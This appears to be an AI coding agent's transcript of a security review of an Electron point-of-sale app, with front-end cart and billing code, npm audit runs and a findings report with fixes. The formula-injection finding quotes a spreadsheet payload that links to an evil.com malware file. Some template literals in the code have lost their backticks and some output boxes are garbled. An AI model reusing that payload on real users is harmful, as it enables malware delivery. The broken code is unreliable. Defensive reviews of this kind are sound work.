@@ -1,0 +1,1013 @@
+
+    paginationContainer.innerHTML = `
+      <button id="prevSalesPageBtn" class="px-3 py-1 rounded bg-gray-200 hover:bg-gray-300 ${currentPage === 1 ?
+  'opacity-50 cursor-not-allowed' : ''}" ${currentPage === 1 ? 'disabled' : ''}>Previous</button>
+      <span class="text-sm">Page ${currentPage} of ${totalPages}</span>
+      <button id="nextSalesPageBtn" class="px-3 py-1 rounded bg-gray-200 hover:bg-gray-300 ${currentPage === totalPages
+  ? 'opacity-50 cursor-not-allowed' : ''}" ${currentPage === totalPages ? 'disabled' : ''}>Next</button>
+    `;
+
+    document.getElementById('prevSalesPageBtn').onclick = () => {
+      if (currentPage > 1) {
+        currentSalesPage = currentPage - 1;
+        applySalesFilters();
+      }
+    };
+
+    document.getElementById('nextSalesPageBtn').onclick = () => {
+      if (currentPage < totalPages) {
+        currentSalesPage = currentPage + 1;
+        applySalesFilters();
+      }
+    };
+  }
+
+  function addToCart(id, name, price) {
+    const existingItem = cart.find((item) => item.id === id);
+    if (existingItem) {
+      existingItem.quantity++;
+    } else {
+      const product = allProducts.find(p => p.id === id);
+      cart.push({
+        id,
+        name,
+        price,
+        quantity: 1,
+        gst_percent: product?.gst_percent || 0,
+        discount: 0,
+        discount_type: 'percent'
+      });
+    }
+    updateCartUI();
+  }
+
+  function updateCartUI() {
+    const cartList = document.getElementById("cartList");
+    const checkoutBtn = document.getElementById("checkoutBtn");
+
+    if (cart.length === 0) {
+      cartList.innerHTML = <p class="text-center text-gray-500">Cart is empty</p>;
+      checkoutBtn.disabled = true;
+    } else {
+      cartList.innerHTML = cart
+        .map(
+          (item, index) => `
+          <div class="flex justify-between items-center p-2 border-b">
+            <div>
+              <p class="font-semibold">${item.name}</p>
+              <p class="text-sm text-gray-600">₹${item.price} x ${item.quantity}</p>
+            </div>
+            <div class="flex items-center">
+              <button class="px-2 py-1 bg-gray-200 rounded" onclick="updateQuantity(${index}, -1)">-</button>
+              <span class="px-4">${item.quantity}</span>
+              <button class="px-2 py-1 bg-gray-200 rounded" onclick="updateQuantity(${index}, 1)">+</button>
+              <button class="ml-4 text-red-500" onclick="removeFromCart(${index})">🗑️</button>
+            </div>
+          </div>
+        `
+        )
+        .join("");
+      checkoutBtn.disabled = false;
+    }
+  }
+
+  function updateQuantity(index, change) {
+    cart[index].quantity += change;
+    if (cart[index].quantity <= 0) {
+      cart.splice(index, 1);
+    }
+    updateCartUI();
+  }
+
+  function removeFromCart(index) {
+    cart.splice(index, 1);
+    updateCartUI();
+  }
+
+  async function renderCartOverlay() {
+    const cartOverlayBody = document.getElementById("cartOverlayBody");
+    const checkoutBtn = document.getElementById("cartCheckoutBtn");
+    const paymentMode = document.getElementById("paymentMode");
+    const customerInvoiceNoInput = document.getElementById("customerInvoiceNo");
+
+    // Fetch and set the next invoice number
+    try {
+      const nextInvoiceNo = await window.api.getNextInvoiceNo();
+      customerInvoiceNoInput.value = nextInvoiceNo;
+    } catch (error) {
+      console.error("Failed to get next invoice number:", error);
+      customerInvoiceNoInput.value = "ERROR";
+    }
+
+    // Enable/disable checkout button based on payment mode
+    function toggleCheckoutButton() {
+      checkoutBtn.disabled = !paymentMode.value;
+    }
+    paymentMode.addEventListener("change", toggleCheckoutButton);
+    toggleCheckoutButton(); // Initial check
+
+    // Populate cart items
+    cartOverlayBody.innerHTML = cart.map((item, index) => {
+      const product = allProducts.find(p => p.id === item.id) || {};
+      const gstRate = item.gst_percent || product.gst_percent || 0;
+      const discount = item.discount || 0;
+      const discountType = item.discount_type || 'percent';
+
+      const gross = item.price * item.quantity;
+      let finalAmount = gross;
+      if (discountType === 'percent') {
+        finalAmount -= (gross * discount / 100);
+      } else {
+        finalAmount -= discount;
+      }
+
+      return `
+        <tr data-index="${index}" class="border-b">
+          <td class="p-2">${index + 1}</td>
+          <td class="p-2">${item.name}</td>
+          <td class="p-2"><input type="number" value="${item.price.toFixed(2)}" class="w-20 border rounded px-1 py-0.5"
+  onchange="updateCartItem(${index}, 'price', this.value)"></td>
+          <td class="p-2"><input type="number" value="${item.quantity}" class="w-16 border rounded px-1 py-0.5"
+  onchange="updateCartItem(${index}, 'quantity', this.value)"></td>
+          <td class="p-2"><input type="number" value="${gstRate}" class="w-16 border rounded px-1 py-0.5"
+  onchange="updateCartItem(${index}, 'gst_percent', this.value)"></td>
+          <td class="p-2"><input type="number" value="${discount}" class="w-20 border rounded px-1 py-0.5"
+  onchange="updateCartItem(${index}, 'discount', this.value)"></td>
+          <td class="p-2 text-right">₹${finalAmount.toFixed(2)}</td>
+        </tr>
+      `;
+    }).join("");
+
+    updateCartTotals();
+  }
+
+  function updateCartItem(index, field, value) {
+    if (field === 'price' || field === 'quantity' || field === 'gst_percent' || field === 'discount') {
+      cart[index][field] = parseFloat(value);
+    }
+    renderCartOverlay();
+  }
+
+  function updateCartTotals() {
+    const footerTotalAmount = document.getElementById("footerTotalAmount");
+    const footerTotalDiscount = document.getElementById("footerTotalDiscount");
+    const footerPayable = document.getElementById("footerPayable");
+    const footerGSTLabel = document.getElementById("footerGSTLabel");
+
+    let totalAmount = 0;
+    let totalDiscount = 0;
+    let totalGST = 0;
+    let gstBreakdown = {};
+
+    cart.forEach(item => {
+      const gross = item.price * item.quantity;
+      let discountAmount = 0;
+      if (item.discount_type === 'percent') {
+        discountAmount = gross * (item.discount / 100);
+      } else {
+        discountAmount = item.discount;
+      }
+      const netAmount = gross - discountAmount;
+      totalAmount += gross;
+      totalDiscount += discountAmount;
+
+      const gstRate = item.gst_percent || 0;
+      const baseAmount = netAmount / (1 + gstRate / 100);
+      const gstAmount = netAmount - baseAmount;
+      totalGST += gstAmount;
+
+      if (gstRate > 0) {
+        if (!gstBreakdown[gstRate]) {
+          gstBreakdown[gstRate] = { base: 0, gst: 0 };
+        }
+        gstBreakdown[gstRate].base += baseAmount;
+        gstBreakdown[gstRate].gst += gstAmount;
+      }
+    });
+
+    footerTotalAmount.textContent = ₹${totalAmount.toFixed(2)};
+    footerTotalDiscount.textContent = − ₹${totalDiscount.toFixed(2)};
+    footerPayable.textContent = ₹${(totalAmount - totalDiscount).toFixed(2)};
+
+    footerGSTLabel.innerHTML = Object.entries(gstBreakdown).map(([rate, amounts]) => {
+      const cgst = (amounts.gst / 2).toFixed(2);
+      return CGST @${rate/2}%: ₹${cgst} | SGST @${rate/2}%: ₹${cgst};
+    }).join('\n');
+  }
+
+  document.getElementById("cartCheckoutBtn").addEventListener("click", async () => {
+    const paymentMethod = document.getElementById("paymentMode").value;
+    const customerName = document.getElementById("custName").value;
+    const customerPhone = document.getElementById("custPhone").value;
+    const custGSTIN = document.getElementById("custGSTIN").value;
+    const invoiceNo = document.getElementById("customerInvoiceNo").value;
+
+    if (!paymentMethod) {
+      showToast("⚠️ Please select a payment method.");
+      return;
+    }
+
+    const saleData = {
+      payment_method: paymentMethod,
+      customer_name: customerName,
+      customer_phone: customerPhone,
+      customer_gstin: custGSTIN,
+      invoice_no: invoiceNo,
+      items: cart,
+    };
+
+    const result = await window.api.saveSale(saleData);
+
+    if (result.success) {
+      showToast("✅ Sale completed!");
+      lastSale = [...cart];
+      cart.length = 0;
+      updateCartUI();
+      document.getElementById("cartOverlay").classList.add("hidden");
+      populateInvoiceModal(lastSale, result.invoice_no);
+      document.getElementById("invoice-modal").classList.remove("hidden");
+    } else {
+      showToast(❌ Sale failed: ${result.message});
+    }
+  });
+
+  document.getElementById("close-invoice-btn").addEventListener("click", () => {
+    document.getElementById("invoice-modal").classList.add("hidden");
+  });
+
+  function showToast(message, type = "info") {
+    const toast = document.createElement("div");
+    const colors = {
+      info: "bg-blue-500",
+      success: "bg-green-500",
+      error: "bg-red-500",
+    };
+    toast.className = fixed bottom-5 right-5 text-white px-4 py-2 rounded shadow-lg z-50 ${colors[type]};
+    toast.textContent = message;
+    document.body.appendChild(toast);
+
+    setTimeout(() => {
+      toast.remove();
+    }, 3000);
+  }
+
+  window.editProduct = async function(id) {
+    editingProductId = id;
+    const product = allProducts.find(p => p.id === id);
+    if (!product) return;
+
+    document.getElementById("modalTitle").textContent = "Edit Product";
+    document.getElementById("productName").value = product.name;
+    document.getElementById("productPrice").value = product.price;
+    document.getElementById("productStock").value = product.stock;
+    document.getElementById("productCategory").value = product.category || "";
+    document.getElementById("productHSN").value = product.hsn_code || "";
+    document.getElementById("productGST").value = product.gst_percent || "";
+    document.getElementById("productProductId").value = product.product_id || "";
+    document.getElementById("productSubCategory").value = product.sub_category || "";
+    document.getElementById("productBrand").value = product.brand || "";
+    document.getElementById("productModelName").value = product.model_name || "";
+    document.getElementById("productUnit").value = product.unit || "";
+    document.getElementById("productBarcodeValue").value = product.barcode_value || "";
+
+    await updateProductModalSubCategoryDropdown(product.category);
+    document.getElementById("productSubCategory").value = product.sub_category || "";
+
+    document.getElementById("productModal").classList.remove("hidden");
+    document.getElementById("fixed-cart-ui").style.display = "none";
+  };
+
+  window.showPrintLabelModal = async function(productId) {
+    const modal = document.getElementById('printLabelModal');
+    if (!modal) return;
+
+    const product = await window.api.getProductById(productId);
+    if (!product) {
+      showToast('Product not found.', 'error');
+      return;
+    }
+
+    modal.dataset.productId = productId;
+
+    document.getElementById('label-product-name').textContent = product.name;
+    document.getElementById('label-mrp').textContent = MRP: ₹${product.price.toFixed(2)};
+    document.getElementById('label-stock-ref').textContent = (In Stock: ${product.stock});
+
+    const storeSettings = await window.api.getStoreSettings();
+    document.getElementById('label-store-name').textContent = storeSettings?.store_name || 'Your Store';
+
+    const barcodeCanvas = document.getElementById('label-barcode');
+    if (product.barcode_value) {
+      bwipjs.toCanvas(barcodeCanvas, {
+        bcid: 'code128',
+        text: product.barcode_value,
+        scale: 2,
+        height: 10,
+        includetext: true,
+        textxalign: 'center',
+      });
+    }
+
+    modal.classList.remove('hidden');
+  };
+
+  window.printLabel = async function(productId) {
+    const quantity = parseInt(document.getElementById('label-quantity').value, 10) || 1;
+    const [widthMm, heightMm] = document.getElementById('label-size').value.split('x').map(Number);
+
+    const product = await window.api.getProductById(productId);
+    const storeSettings = await window.api.getStoreSettings();
+
+    for (let i = 0; i < quantity; i++) {
+      const barcodeSvg = await new Promise((resolve, reject) => {
+        const hiddenCanvas = document.createElement('canvas');
+        bwipjs.toCanvas(hiddenCanvas, {
+          bcid: 'code128',
+          text: product.barcode_value,
+          scale: 3,
+          height: 12,
+          includetext: true,
+          textxalign: 'center',
+        }, (err, canvas) => {
+          if (err) reject(err);
+          else resolve(canvas.toDataURL('image/png'));
+        });
+      });
+
+      const html = `
+        <html>
+          <head>
+            <style>
+              @page { margin: 0; size: ${widthMm}mm ${heightMm}mm; }
+              body {
+                margin: 0;
+                padding: 1mm;
+                font-family: Arial, sans-serif;
+                font-size: 8pt;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                text-align: center;
+                width: ${widthMm}mm;
+                height: ${heightMm}mm;
+                box-sizing: border-box;
+              }
+              .store { font-weight: bold; font-size: 9pt; margin-bottom: 1mm; }
+              .name { font-size: 8pt; margin-bottom: 1mm; }
+              .barcode { margin-bottom: 1mm; }
+              .mrp { font-weight: bold; font-size: 10pt; }
+            </style>
+          </head>
+          <body>
+            <div class="store">${storeSettings?.store_name || ''}</div>
+            <div class="name">${product.name}</div>
+            <img class="barcode" src="${barcodeSvg}" />
+            <div class="mrp">MRP: ₹${product.price.toFixed(2)}</div>
+          </body>
+        </html>
+      `;
+
+      const result = await window.api.printLabel({
+        html,
+        width: widthMm * 1000,
+        height: heightMm * 1000,
+      });
+
+      if (!result.success) {
+        showToast(Print failed: ${result.message}, 'error');
+        break;
+      }
+    }
+  };
+  I have analyzed the codebase. I will now run the requested commands to check for dependency vulnerabilities and other
+  potential issues.
+ ╭────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+ │ ✔  Shell npm audit --production                                                                                │
+ │                                                                                                                │
+ │    # npm audit report                                                                                          │
+ │                                                                                                                │
+ │    form-data  <2.5.4                                                                                           │
+ │    Severity: critical                                                                                          │
+ │    form-data uses unsafe random function in form-data for choosing boundary -                                  │
+ │    https://github.com/advisories/GHSA-fjxv-7rqg-78g4                                                           │
+ │    fix available via `npm audit fix`                                                                           │
+ │    node_modules/form-data                                                                                      │
+ │      request  *                                                                                                │
+ │      Depends on vulnerable versions of form-data                                                               │
+ │      Depends on vulnerable versions of tough-cookie                                                            │
+ │      node_modules/request                                                                                      │
+ │        get-pixels  >=2.0.0                                                                                     │
+ │        Depends on vulnerable versions of request                                                               │
+ │        node_modules/get-pixels                                                                                 │
+ │                                                                                                                │
+ │                                                                                                                │
+ │    tough-cookie  <4.1.3                                                                                        │
+ │    Severity: moderate                                                                                          │
+ │    tough-cookie Prototype Pollution vulnerability - https://github.com/advisories/GHSA-72xf-g2v4-qvf3          │
+ │    fix available via `npm audit fix`                                                                           │
+ │    node_modules/tough-cookie                                                                                   │
+ │                                                                                                                │
+ │    4 vulnerabilities (2 moderate, 2 critical)                                                                  │
+ │                                                                                                                │
+ │    To address all issues, run:                                                                                 │
+ │      npm audit fix                                                                                             │
+ │                                                                                                                │
+ │    npm warn config production Use `--omit=dev` instead.                                                        │
+ │                                                                                                                │
+ ╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+✦ The npm audit command found 4 vulnerabilities (2 moderate, 2 critical). I will now proceed with the Electron security
+  linting.
+ ╭────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+ │ ✔  Shell npx @electroneagle/sec-lint . || true                                                                 │
+ │                                                                                                                │
+ │                                                                                                                │
+ │    npm error code E404                                                                                         │
+ │    npm error 404 Not Found - GET https://registry.npmjs.org/@electroneagle%2fsec-lint - Not found              │
+ │    npm error 404                                                                                               │
+ │    npm error 404  The requested resource '@electroneagle/sec-lint@*' could not be found or you do not have     │
+ │    permission to access it.                                                                                    │
+ │    npm error 404                                                                                               │
+ │    npm error 404 Note that you can also install from a                                                         │
+ │    npm error 404 tarball, folder, http url, or git url.                                                        │
+ │    npm error A complete log of this run can be found in:                                                       │
+ │    C:\Users\Asus\AppData\Local\npm-cache\_logs\2025-08-20T09_38_46_082Z-debug-0.log                            │
+                                               │ external command,
+                                                                            │
+ │                                                                                                                │
+ ╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+✦ The Electron security linter package was not found. I will now check the SQLite database integrity and foreign key
+  constraints.
+ ╭────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+ │ ✔  Shell sqlite3 pos.db "PRAGMA integrity_check; PRAGMA foreign_keys;"                                         │
+ │                                                                                                                │
+                                                                                                         │
+                                                                                                          │
+ │                                                                                                                │
+ ╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+✦ Based on my analysis of the provided code and the command results, here is the production readiness and security review.
+
+  Command Execution Results
+
+   1. `npm audit --production`:
+       * Result: Failed with 4 vulnerabilities (2 critical, 2 moderate).
+       * Details: Critical vulnerability in form-data (<2.5.4) and moderate in tough-cookie (<4.1.3).
+   2. `npx @electroneagle/sec-lint . || true`:
+       * Result: Failed to execute.
+       * Details: The package @electroneagle/sec-lint could not be found in the npm registry (404 error). The command
+         syntax also failed on Windows.
+   3. `sqlite3 pos.db "PRAGMA integrity_check; PRAGMA foreign_keys;"`:
+       * Result: ok, 0.
+       * Details: The database integrity check passed (ok). However, PRAGMA foreign_keys returned 0, indicating that
+         foreign key constraints are OFF by default for the command-line session. While db.js enables it, this discrepancy
+         is worth noting.
+
+  ---
+
+  Findings Report
+
+  A. Security
+
+  ---
+
+  [CRITICAL] Missing Content-Security-Policy (CSP)
+
+   * Evidence: (index.html)
+
+   1     <!DOCTYPE html>
+   2     <html lang="en">
+   3     <head>
+   4       <meta charset="UTF-8" />
+   5       <title>POS System</title>
+   6       <link href="./styles/output.css" rel="stylesheet" />
+   7     ...
+   8     </head>
+   * Impact: Lack of a CSP allows for the execution of arbitrary inline scripts and loading of resources from untrusted
+     domains, making the application vulnerable to Cross-Site Scripting (XSS) attacks. If an attacker can inject malicious
+     scripts, they could steal user data or perform unauthorized actions.
+   * Fix: Add a strict CSP <meta> tag to the <head> of index.html.
+
+    1     --- a/index.html
+    2     +++ b/index.html
+    3     @@ -3,6 +3,7 @@
+    4      <head>
+    5        <meta charset="UTF-8" />
+    6        <title>POS System</title>
+    7 +      <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'
+      https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline'
+      https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:;">
+    8        <link href="./styles/output.css" rel="stylesheet" />
+    9        <link rel="preconnect" href="https://fonts.googleapis.com">
+   10        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+   11
+   * Test: After applying the fix, verify that the application functions correctly. Check the developer console for any
+     CSP violation errors. The provided CSP is restrictive and may need adjustment if other external resources are used.
+
+  ---
+
+  [CRITICAL] Missing IPC Payload Validation
+
+   * Evidence: (main.js)
+
+   1     ipcMain.handle("save-sale", async (event, saleData) => {
+   2       try {
+   3         const {
+   4           payment_method,
+   5           customer_name,
+   6           // ...
+   7           items
+   8         } = saleData;
+   9     // No validation is performed on saleData or its properties
+   * Impact: Unvalidated data from the renderer process can lead to unexpected errors, data corruption, or security
+     vulnerabilities. A malicious or malformed payload could crash the main process or lead to incorrect database entries
+     (e.g., negative quantities, incorrect prices).
+   * Fix: Implement type and content validation for all data received from the renderer process. Using a library like Zod
+     is recommended.
+
+    1     // At the top of main.js
+    2     const { z } = require("zod");
+    3
+    4     // Example for 'save-sale'
+    5     const saleSchema = z.object({
+    6       payment_method: z.string().min(1),
+    7       customer_name: z.string().optional(),
+    8       customer_phone: z.string().optional(),
+    9       customer_gstin: z.string().optional(),
+   10       invoice_no: z.string().min(1),
+   11       items: z.array(z.object({
+   12         id: z.number().int(),
+   13         name: z.string(),
+   14         price: z.number(),
+   15         quantity: z.number().positive(),
+   16         gst_percent: z.number().min(0).optional(),
+   17       })).min(1),
+   18     });
+   19
+   20     ipcMain.handle("save-sale", async (event, saleData) => {
+   21       try {
+   22         const validatedData = saleSchema.parse(saleData);
+   23         // ... proceed with using validatedData
+   24         const result = dbAPI.saveSale({ ...validatedData, timestamp: new Date().toISOString() });
+   25         // ...
+   26       } catch (err) {
+   27         console.error("❌ Error during sale save:" , err);
+   28         // If err is a ZodError, it's a validation failure
+   29         return { success: false, message: err.errors || err.message || "Unknown error" };
+   30       }
+   31     });
+   * Test: Attempt to send malformed data from the renderer via the developer console (e.g., window.api.saveSale({ items:
+     [] })). The main process should reject the request and return a validation error instead of crashing or processing
+     invalid data.
+
+  ---
+
+  [HIGH] Unsafe BrowserWindow Configuration
+
+   * Evidence: (main.js)
+
+   1     mainWindow = new BrowserWindow({
+   2       width: 1000,
+   3       height: 700,
+   4       webPreferences: {
+   5         preload: path.join(__dirname, 'preload.js'),
+   6         contextIsolation: true,
+   7         nodeIntegration: false,
+   8       }
+   9     });
+   * Impact: The sandbox: true option is missing. Without sandboxing, a compromise in the renderer process has a much
+     larger blast radius, potentially allowing access to Node.js primitives and system resources that the sandbox is
+     designed to protect against.
+   * Fix: Enable the sandbox for all BrowserWindow instances.
+
+    1     --- a/main.js
+    2     +++ b/main.js
+    3     @@ -100,6 +100,7 @@
+    4        webPreferences: {
+    5          preload: path.join(__dirname, 'preload.js'),
+    6          contextIsolation: true,
+    7 +        sandbox: true,
+    8          nodeIntegration: false,
+    9        }
+   10      });
+   11
+   * Test: After enabling the sandbox, thoroughly test all application functionality. Sandboxing can restrict certain
+     APIs, so ensure that all IPC channels and renderer features still work as expected.
+
+  ---
+
+  [HIGH] CSV/Excel Formula Injection
+
+   * Evidence: (main.js, generateCsvFallback function)
+
+   1     const rows = data.map(row => {
+   2         const sanitizedRow = [
+   3           // ...
+   4           `"${(row.customer_name || '').replace(/"/g, '""')}"`, // No sanitization for formulas
+   5           // ...
+   6         ];
+   7         return sanitizedRow.join(',');
+   8       });
+   * Impact: If a customer's name or item name begins with =, +, -, or @, spreadsheet software (like Excel) may interpret
+     it as a formula. This can be exploited to execute malicious code on the user's computer when they open the exported
+     file (e.g., =HYPERLINK("http://evil.com/malware.exe", "Click Me")).
+   * Fix: Prepend a single quote (') to any cell value that starts with a character that could trigger formula injection.
+
+    1     // In main.js, add a sanitizer function
+    2     function sanitizeCell(value) {
+    3       const strValue = String(value || '');
+    4       if (['=', '+', '-', '@', '\t', '\r'].some(char => strValue.startsWith(char))) {
+    5         return "'" + strValue;
+    6       }
+    7       return strValue;
+    8     }
+    9
+   10     // In generateExcelReport
+   11     data.forEach(row => {
+   12       invoiceSheet.addRow({
+   13         customer_name: sanitizeCell(row.customer_name),
+   14         item_name: sanitizeCell(row.item_name),
+   15         // ... sanitize other string fields
+   16       });
+   17     });
+   18
+   19     // In generateCsvFallback
+   20     const sanitizedRow = [
+   21         sanitizeCell(row.invoice_no),
+   22         // ...
+   23         `"${sanitizeCell(row.customer_name).replace(/"/g, '""')}"`,
+   24         // ...
+   25     ];
+   * Test: Create a product or customer with the name =2+2. Export the data to Excel/CSV. Open the file and confirm the
+     cell displays =2+2 as text, not 4 as a calculated formula.
+
+  ---
+
+  [HIGH] Unpatched Dependencies with Critical Vulnerabilities
+
+   * Evidence: (npm audit output)
+   1     form-data  <2.5.4
+   2     Severity: critical
+   * Impact: The identified vulnerabilities in dependencies (form-data, tough-cookie) can be inherited by the application,
+     potentially introducing security holes like unsafe random function usage, which could be exploited in specific
+     scenarios.
+   * Fix: Run npm audit fix to automatically update the vulnerable dependencies to patched versions.
+
+ ╭────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+ │ ✔  Shell npm audit fix (Fixes vulnerable npm packages.)                                                        │
+ │                                                                                                                │
+ │                                                                                                                │
+ │    up to date, audited 385 packages in 4s                                                                      │
+ │                                                                                                                │
+ │    50 packages are looking for funding                                                                         │
+ │      run `npm fund` for details                                                                                │
+ │                                                                                                                │
+ │    # npm audit report                                                                                          │
+ │                                                                                                                │
+ │    form-data  <2.5.4                                                                                           │
+ │    Severity: critical                                                                                          │
+ │    form-data uses unsafe random function in form-data for choosing boundary -                                  │
+ │    https://github.com/advisories/GHSA-fjxv-7rqg-78g4                                                           │
+ │    fix available via `npm audit fix`                                                                           │
+ │    node_modules/form-data                                                                                      │
+ │      request  *                                                                                                │
+ │      Depends on vulnerable versions of form-data                                                               │
+ │      Depends on vulnerable versions of tough-cookie                                                            │
+ │      node_modules/request                                                                                      │
+ │        get-pixels  >=2.0.0                                                                                     │
+ │        Depends on vulnerable versions of request                                                               │
+ │        node_modules/get-pixels                                                                                 │
+ │                                                                                                                │
+ │                                                                                                                │
+ │    tough-cookie  <4.1.3                                                                                        │
+ │    Severity: moderate                                                                                          │
+ │    tough-cookie Prototype Pollution vulnerability - https://github.com/advisories/GHSA-72xf-g2v4-qvf3          │
+ │    fix available via `npm audit fix`                                                                           │
+ │    node_modules/tough-cookie                                                                                   │
+ │                                                                                                                │
+ │    4 vulnerabilities (2 moderate, 2 critical)                                                                  │
+ │                                                                                                                │
+ │    To address all issues, run:                                                                                 │
+ │      npm audit fix                                                                                             │
+ │                                                                                                                │
+ ╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+✦ npm audit fix did not resolve the vulnerabilities, likely due to dependency constraints. A manual update of the packages
+  (e.g., npm install exceljs@latest) or replacing the deprecated request package is required.
+
+  I will now continue with the rest of the report.
+
+  ---
+
+  [MEDIUM] Missing Navigation Lockdown
+
+   * Evidence: (main.js) The file lacks handlers for setWindowOpenHandler and the will-navigate event.
+   * Impact: The application could be redirected to external, malicious websites if a vulnerability allows attackers to
+     trigger navigation events. This could lead to phishing or other web-based attacks.
+   * Fix: Add handlers in main.js to block all new windows and external navigations.
+
+    1     // In the createWindow function, after loading the file:
+    2     mainWindow.loadFile('index.html');
+    3
+    4     // Add these handlers
+    5     mainWindow.webContents.setWindowOpenHandler(() => ({ action: 'deny' }));
+    6
+    7     mainWindow.webContents.on('will-navigate', (event, url) => {
+    8       // Allow navigation only within the app's own pages
+    9       if (!url.startsWith('file://')) {
+   10         event.preventDefault();
+   11       }
+   12     });
+   * Test: From the renderer's developer console, try executing window.location.href = 'https://google.com'. The
+     navigation should be blocked.
+
+  ---
+
+  B. Data Integrity
+
+  ---
+
+  [CRITICAL] Sale Persistence is Not Atomic
+
+   * Evidence: (db.js, saveSale function)
+
+    1     // ...
+    2     const insertSale = db.prepare(`...`);
+    3     const saleInfo = insertSale.run(...); // <-- Sale header is saved here
+    4
+    5     const saleId = saleInfo.lastInsertRowid;
+    6
+    7     const insertItem = db.prepare(`...`);
+    8
+    9     const insertMany = db.transaction((items) => { // <-- Transaction starts AFTER sale header is saved
+   10       for (const i of items) {
+   11         insertItem.run(...);
+   12         db.prepare(`UPDATE products SET stock = stock - ? WHERE id = ?`).run(...);
+   13       }
+   14     });
+   15
+   16     insertMany(enrichedItems);
+   * Impact: The sale record is created before the transaction that saves the sale items and updates stock. If the item
+     insertion or stock update fails, the main sale record will still exist in the database, creating orphaned sales and
+     incorrect financial records.
+   * Fix: Wrap the entire operation—sale insertion, item insertion, and stock updates—in a single transaction.
+
+   ... first 60 lines hidden ...
+    61        { name: "invoice_no", type: "TEXT" },
+    62        { name: "payment_method", type: "TEXT" },
+    63 @@ -389,6 +391,31 @@
+    64        if (!salesCols.includes(col.name)) {
+    65          db.prepare(`ALTER TABLE sales ADD COLUMN ${col.name} ${col.type}`).run();
+    66        }
+    67 +    }
+    68 +
+    69 +    const enrichedItems = items.map(i => {
+    70 +      const price = i.price;
+    71 +      const qty = i.quantity;
+    72 +      const gstRate = i.gst_percent ?? 0;
+    73 +      const totalMRP = price * qty;
+    74 +      const divisor = 1 + gstRate / 100;
+    75 +      const taxableValue = +(totalMRP / divisor).toFixed(2);
+    76 +      const gstAmount = +(totalMRP - taxableValue).toFixed(2);
+    77 +      const cgst = +(gstAmount / 2).toFixed(2);
+    78 +      const sgst = +(gstAmount / 2).toFixed(2);
+    79 +      return { ...i, taxable_value: taxableValue, gst_amount: gstAmount, cgst, sgst };
+    80 +    });
+    81 +
+    82 +    const total = enrichedItems.reduce((acc, i) => acc + i.taxable_value + i.gst_amount, 0);
+    83 +
+    84 +    // Assertion: Check for rounding errors before committing
+    85 +    const itemsTotal = items.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+    86 +    if (Math.abs(itemsTotal - total) > 0.01 * items.length) {
+    87 +        throw new Error(`Reconciliation failed: Items total (${itemsTotal}) does not match calculated total
+       (${total}).`);
+    88      }
+    89
+    90      const insertSale = db.prepare(`
+    91 @@ -406,10 +433,7 @@
+    92        customer_phone || null,
+    93        customer_gstin || null
+    94      );
+    95 -
+    96      const saleId = saleInfo.lastInsertRowid;
+    97 -
+    98      const insertItem = db.prepare(`
+    99        INSERT INTO sale_items (
+   100          sale_id, product_id, name, price, quantity,
+   101 @@ -417,36 +441,31 @@
+   102          gst_amount, cgst, sgst
+   103        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+   104      `);
+   105 -
+   106 -    const insertMany = db.transaction((items) => {
+   107 -      for (const i of items) {
+   108 -        insertItem.run(
+   109 -          saleId,
+   110 -          i.product_id || null, // Use the generated product_id string
+   111 -          i.name,
+   112 -          i.price,
+   113 -          i.quantity,
+   114 -          i.hsn_code || null,
+   115 -          i.gst_percent ?? null,
+   116 -          i.taxable_value,
+   117 -          i.gst_amount,
+   118 -          i.cgst,
+   119 -          i.sgst
+   120 -        );
+   121 -
+   122 -        if (i.id) {
+   123 -          db.prepare(`UPDATE products SET stock = stock - ? WHERE id = ?`)
+   124 -            .run(i.quantity, i.id);
+   125 -        }
+   126 +    const updateStock = db.prepare(`UPDATE products SET stock = stock - ? WHERE id = ?`);
+   127 +
+   128 +    for (const item of enrichedItems) {
+   129 +      insertItem.run(
+   130 +        saleId, item.product_id || null, item.name, item.price, item.quantity,
+   131 +        item.hsn_code || null, item.gst_percent ?? null, item.taxable_value,
+   132 +        item.gst_amount, item.cgst, item.sgst
+   133 +      );
+   134 +      if (item.id) {
+   135 +        updateStock.run(item.quantity, item.id);
+   136        }
+   137 -    });
+   138 -
+   139 -    insertMany(enrichedItems);
+   140 -
+   141 -    return {
+   142 -      success: true,
+   143 -      sale_id: saleId,
+   144 -      invoice_no: invoice_no // Send back the provided invoice number
+   145 -    };
+   146 +    }
+   147 +    return { sale_id: saleId, invoice_no: invoice_no };
+   148 +  });
+   149 +
+   150 +  try {
+   151 +    const result = saveTransaction(saleData);
+   152 +    return { success: true, ...result };
+   153    } catch (err) {
+   154      console.error("❌ Failed to save sale:", err);
+   155      return { success: false, message: 'Error saving sale' };
+   156    }
+   157  }
+   158 +
+   * Test: Manually introduce an error in the UPDATE products statement within the transaction (e.g., misspell a column
+     name). Attempt to save a sale. The entire operation should fail, and no new record should appear in the sales table.
+
+  ---
+
+  [MEDIUM] Potential Rounding Errors in Financial Calculations
+
+   * Evidence: (db.js, saveSale function)
+
+   1     const taxableValue = +(totalMRP / divisor).toFixed(2);
+   2     const gstAmount = +(totalMRP - taxableValue).toFixed(2);
+   3     const cgst = +(gstAmount / 2).toFixed(2);
+   4     const sgst = +(gstAmount / 2).toFixed(2);
+   * Impact: Using floating-point arithmetic and toFixed() for currency can introduce small rounding errors. Over many
+     transactions, these small discrepancies can accumulate, leading to incorrect financial reporting and reconciliation
+     problems.
+   * Fix: Perform all financial calculations using integers by working in the smallest currency unit (e.g., paise).
+
+    1     // In saveSale, after wrapping in a transaction
+    2     const priceInPaise = Math.round(i.price * 100);
+    3     const gstRate = i.gst_percent ?? 0;
+    4
+    5     const totalMRPInPaise = priceInPaise * i.quantity;
